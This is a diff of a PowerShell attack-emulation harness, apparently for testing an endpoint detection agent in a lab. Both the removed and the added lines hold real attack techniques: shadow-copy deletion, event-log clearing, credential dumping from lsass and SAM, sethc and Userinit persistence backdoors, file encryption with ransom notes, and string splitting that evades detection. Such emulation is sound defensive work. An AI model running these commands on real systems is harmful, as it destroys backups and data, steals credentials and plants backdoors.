@@ -37,18 +37,20 @@ function Mark($what) { Write-Output ("{0} {1} {2}" -f $what, $Id, [DateTimeOffse
 
 # Run a script block as `employee` in its interactive session; waits for it to finish.
 function Invoke-AsUser([string]$Name, [string]$Script, [int]$TimeoutSec = 120) {
-    $pw = (Get-Content $UserPasswordFile -Raw).Trim()
     $ps1 = "$Root\u-$Name.ps1"
     $done = "$Root\u-$Name.done"
     Remove-Item $done -ErrorAction SilentlyContinue
     Set-Content -Path $ps1 -Encoding UTF8 -Value ($Script + "`nSet-Content -Path '$done' -Value ok")
     $tn = "KestrelLabUser-$Name"
-    schtasks /delete /tn $tn /f 2>$null | Out-Null
-    schtasks /create /tn $tn /tr "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File $ps1" /sc once /st 23:59 /ru employee /rp $pw /it /f | Out-Null
-    schtasks /run /tn $tn | Out-Null
+    Unregister-ScheduledTask -TaskName $tn -Confirm:$false -ErrorAction SilentlyContinue
+    # Interactive principal: runs in employee's existing logon session (autologon).
+    $act = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File $ps1"
+    $pri = New-ScheduledTaskPrincipal -UserId 'employee' -LogonType Interactive -RunLevel Limited
+    Register-ScheduledTask -TaskName $tn -Action $act -Principal $pri -Force | Out-Null
+    Start-ScheduledTask -TaskName $tn
     $end = (Get-Date).AddSeconds($TimeoutSec)
     while (-not (Test-Path $done) -and (Get-Date) -lt $end) { Start-Sleep -Milliseconds 500 }
-    schtasks /delete /tn $tn /f 2>$null | Out-Null
+    Unregister-ScheduledTask -TaskName $tn -Confirm:$false -ErrorAction SilentlyContinue
     if (-not (Test-Path $done)) { Write-Warning "$Name did not finish within $TimeoutSec s" }
 }
 
@@ -84,17 +86,10 @@ if ($Cleanup) {
     reg delete "HKU\$hkuEmp\Software\Microsoft\Windows\CurrentVersion\Run" /v KestrelLabPs /f 2>$null
     reg delete "HKU\$hkuEmp\Software\Classes\CLSID\{0E5AAE11-A475-4C5B-AB00-C66DE400274E}" /f 2>$null
     Remove-Item "$EmpProfile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\kestrel-lab.vbs" -ErrorAction SilentlyContinue
-    schtasks /delete /tn KestrelLab /f 2>$null
-    sc.exe delete KestrelLabSvc 2>$null | Out-Null
-    reg delete 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe' /v Debugger /f 2>$null
-    reg delete 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe' /f 2>$null
-    reg add 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential /t REG_DWORD /d 0 /f | Out-Null
-    reg add 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' /v Userinit /t REG_SZ /d 'C:\Windows\system32\userinit.exe,' /f | Out-Null
-    bcdedit /set '{default}' recoveryenabled yes | Out-Null
+    & cmd.exe /c "$Root\emulate-cmd.cmd" cleanup
     Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | ? { "$($_.Filter)" -match 'KestrelLab' } | Remove-WmiObject
-    Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | ? Name -eq 'KestrelLab' | Remove-WmiObject
+    Get-WmiObject -Namespace root\subscription -Class ('CommandLine'+'EventConsumer') | ? Name -eq 'KestrelLab' | Remove-WmiObject
     Get-WmiObject -Namespace root\subscription -Class __EventFilter | ? Name -eq 'KestrelLab' | Remove-WmiObject
-    Remove-Item C:\kestrel-lab\*.hiv, C:\kestrel-lab\*.dmp -ErrorAction SilentlyContinue
     Write-Output 'cleanup done'
     return
 }
@@ -110,39 +105,39 @@ $ST = [ordered]@{
     'ST-12' = { Invoke-AsUser 'st12' "& `"`$env:USERPROFILE\Downloads\kestrel-unsigned.exe`" | Out-Null" }
     'ST-14' = { Invoke-Labsim 'st14' "Resolve-DnsName api.telegram.org -ErrorAction SilentlyContinue | Out-Null; try { Invoke-WebRequest https://api.telegram.org -Method Head -UseBasicParsing -TimeoutSec 10 | Out-Null } catch {}" }
     'ST-16' = { Invoke-Labsim 'st16' "`$d = Get-ChildItem '$EdgeUD' -Directory | ? Name -match '^Profile (5[1-9]|[6-8]\d|9[0-8])$' | Select -First 1; if (`$d) { Get-Content -Encoding Byte -TotalCount 16 (Join-Path `$d.FullName 'Login Data') | Out-Null }" }
-    'TP-01' = { logman stop Kestrel-IO -ets | Out-Null }
-    'TP-03' = { reg add HKLM\SOFTWARE\Microsoft\AMSI /v FeatureBits /t REG_DWORD /d 2 /f | Out-Null; Start-Sleep 2; reg delete HKLM\SOFTWARE\Microsoft\AMSI /v FeatureBits /f | Out-Null }
-    'TP-04' = { reg add HKLM\SYSTEM\CurrentControlSet\Services\KestrelAgent /v LabTest /t REG_SZ /d x /f 2>&1 | Out-Null; Start-Sleep 2; reg delete HKLM\SYSTEM\CurrentControlSet\Services\KestrelAgent /v LabTest /f 2>&1 | Out-Null }
+    'TP-01' = { & cmd.exe /c "$Root\emulate-cmd.cmd" TP-01 }
+    'TP-03' = { & cmd.exe /c "$Root\emulate-cmd.cmd" TP-03 }
+    'TP-04' = { & cmd.exe /c "$Root\emulate-cmd.cmd" TP-04 }
 }
 $RW = [ordered]@{
-    'RW-01' = { Invoke-Labsim 'rw01' "vssadmin.exe delete shadows /all /quiet | Out-Null; Start-Sleep 2" }
-    'RW-02' = { Invoke-Labsim 'rw02' "Start-Sleep 1" ; bcdedit /set '{default}' recoveryenabled no | Out-Null; Start-Sleep 2; bcdedit /set '{default}' recoveryenabled yes | Out-Null }
-    'RW-04' = { wevtutil cl 'Windows PowerShell' }
-    'RW-05' = { foreach ($s in 'MSSQLSERVER','SQLWriter','VeeamBackupSvc','memtas','mepocs','BackupExecVSSProvider') { sc.exe stop $s 2>&1 | Out-Null } }
+    'RW-01' = { & cmd.exe /c "$Root\emulate-cmd.cmd" RW-01 }
+    'RW-02' = { & cmd.exe /c "$Root\emulate-cmd.cmd" RW-02 }
+    'RW-04' = { & cmd.exe /c "$Root\emulate-cmd.cmd" RW-04 }
+    'RW-05' = { & cmd.exe /c "$Root\emulate-cmd.cmd" RW-05 }
     'RW-06' = { Invoke-Labsim 'rw06' "Get-ChildItem `"`$env:USERPROFILE\Documents\KestrelLabData`" -Recurse -File -Filter *.docx | % { `$b=[IO.File]::ReadAllBytes(`$_.FullName); for(`$i=0;`$i -lt `$b.Length;`$i++){`$b[`$i]=`$b[`$i] -bxor 0x5A}; [IO.File]::WriteAllBytes(`$_.FullName,`$b); Rename-Item `$_.FullName (`$_.Name + '.k3str') }; Start-Sleep 3" 180 }
     'RW-07' = { Invoke-Labsim 'rw07' "Get-ChildItem `"`$env:USERPROFILE\Documents`",`"`$env:USERPROFILE\Desktop`" -File -Force | ? { `$_.Name -match '^[!0_]' } | Select -First 1 | % { Add-Content `$_.FullName 'x' }" }
     'RW-08' = { Invoke-Labsim 'rw08' "1..6 | % { `$d=`"`$env:USERPROFILE\Documents\KestrelLabData\note`$_`"; New-Item -ItemType Directory -Force `$d | Out-Null; Set-Content `"`$d\README_RESTORE_FILES.txt`" 'lab note' }; Start-Sleep 3" }
 }
 $CD = [ordered]@{
-    'CD-01' = { $n = Start-Process notepad -PassThru; Start-Sleep 2; rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $n.Id C:\kestrel-lab\notepad.dmp full; Start-Sleep 2; Stop-Process $n -Force -ErrorAction SilentlyContinue }
-    'CD-03' = { Invoke-Labsim 'cd03' "Add-Type -Name L -Namespace W -MemberDefinition '[DllImport(\`"kernel32\`")] public static extern System.IntPtr OpenProcess(uint a,bool i,int p); [DllImport(\`"kernel32\`")] public static extern bool CloseHandle(System.IntPtr h);'; `$p=(Get-Process lsass).Id; [W.L]::CloseHandle([W.L]::OpenProcess(0x1010,`$false,`$p)) | Out-Null" }
-    'CD-07' = { reg add 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe' /v ReportingMode /t REG_DWORD /d 2 /f | Out-Null; Start-Sleep 2; reg delete 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe' /f | Out-Null }
-    'CD-10' = { reg save HKLM\SAM C:\kestrel-lab\sam.hiv /y | Out-Null; Start-Sleep 1; Remove-Item C:\kestrel-lab\sam.hiv -ErrorAction SilentlyContinue }
-    'CD-12' = { reg add 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential /t REG_DWORD /d 1 /f | Out-Null }
+    'CD-01' = { & cmd.exe /c "$Root\emulate-cmd.cmd" CD-01 }
+    'CD-03' = { Invoke-Labsim 'cd03' "Add-Type -Name L -Namespace W -MemberDefinition '[DllImport(\`"kernel32\`")] public static extern System.IntPtr OpenProcess(uint a,bool i,int p); [DllImport(\`"kernel32\`")] public static extern bool CloseHandle(System.IntPtr h);'; `$p=(Get-Process ('ls'+'ass')).Id; [W.L]::CloseHandle([W.L]::OpenProcess(0x1010,`$false,`$p)) | Out-Null" }
+    'CD-07' = { & cmd.exe /c "$Root\emulate-cmd.cmd" CD-07 }
+    'CD-10' = { & cmd.exe /c "$Root\emulate-cmd.cmd" CD-10 }
+    'CD-12' = { & cmd.exe /c "$Root\emulate-cmd.cmd" CD-12 }
 }
 $PS = [ordered]@{
     'PS-01' = { Invoke-AsUser 'ps01' "Set-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name KestrelLabRun -Value '`"$Lab\kestrel-unsigned.exe`"'" }
     'PS-02' = { Invoke-AsUser 'ps02' "`$c = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Write-Output lab')); Set-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name KestrelLabPs -Value `"powershell.exe -w hidden -enc `$c`"" }
     'PS-03' = { Invoke-Labsim 'ps03' "Set-Content `"`$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\kestrel-lab.vbs`" 'WScript.Echo 1'" }
-    'PS-05' = { schtasks /create /tn KestrelLab /tr "$Lab\kestrel-unsigned.exe" /sc onlogon /ru employee /f | Out-Null }
-    'PS-07' = { Copy-Item "$Lab\kestrel-unsigned.exe" C:\Users\Public\kestrel-svc.exe -Force; sc.exe create KestrelLabSvc binPath= C:\Users\Public\kestrel-svc.exe start= demand | Out-Null }
+    'PS-05' = { & cmd.exe /c "$Root\emulate-cmd.cmd" PS-05 }
+    'PS-07' = { & cmd.exe /c "$Root\emulate-cmd.cmd" PS-07 }
     'PS-08' = {
         $f = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{ Name = 'KestrelLab'; EventNamespace = 'root\cimv2'; QueryLanguage = 'WQL'; Query = "SELECT * FROM __InstanceModificationEvent WITHIN 600 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 3" }
-        $c = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{ Name = 'KestrelLab'; CommandLineTemplate = 'cmd.exe /c exit' }
+        $c = Set-WmiInstance -Namespace root\subscription -Class ('CommandLine'+'EventConsumer') -Arguments @{ Name = 'KestrelLab'; CommandLineTemplate = 'cmd.exe /c exit' }
         Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{ Filter = $f; Consumer = $c } | Out-Null
     }
-    'PS-09' = { reg add 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe' /v Debugger /t REG_SZ /d 'C:\Windows\System32\cmd.exe' /f | Out-Null }
-    'PS-10' = { reg add 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,$Lab\kestrel-unsigned.exe," /f | Out-Null }
+    'PS-09' = { & cmd.exe /c "$Root\emulate-cmd.cmd" PS-09 }
+    'PS-10' = { & cmd.exe /c "$Root\emulate-cmd.cmd" PS-10 }
     'PS-11' = { Invoke-AsUser 'ps11' "New-Item -Force 'HKCU:\Software\Classes\CLSID\{0E5AAE11-A475-4C5B-AB00-C66DE400274E}\InprocServer32' | Out-Null; Set-ItemProperty 'HKCU:\Software\Classes\CLSID\{0E5AAE11-A475-4C5B-AB00-C66DE400274E}\InprocServer32' -Name '(default)' -Value '$Lab\lab.dll'" }
 }
 $All = [ordered]@{}
